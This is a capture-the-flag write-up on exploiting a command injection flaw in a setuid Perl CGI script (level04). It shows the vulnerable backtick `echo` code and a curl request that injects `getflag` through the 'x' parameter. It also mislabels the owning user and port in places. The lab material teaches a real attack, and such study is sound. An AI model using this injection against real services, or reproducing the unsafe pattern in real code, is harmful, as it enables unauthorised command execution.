# level04 - Command injection - Exploit perl scipt

## Summary
First of all, we look at the file in `HOME` directory and we find the file `level04.pl`:
```shell
~$ $ ls -l level04.pl

-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

~$ cat level04.pl

#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
From the file, we can see that the flag05's **suid bit** is set. The programm binds a socket on port 4646 and it takes a parameter ‘x’ whatever it is. We can check
also curl http://localhost:4747 to look if a server is running and... it is !
As expected, the result of the command is just an echo…
It does not take more to exploit it !


## Exploit

To exploit it, just give the getflag value to the x parameter using curl. This result of getflag will be displayed by the echo command present in the perl script.
```shell
curl http://localhost:4747 -d 'x=`getflag`'
```
> On this exploit, we ran directly command `getflag` from flag04's user. So, just log on level05 user.
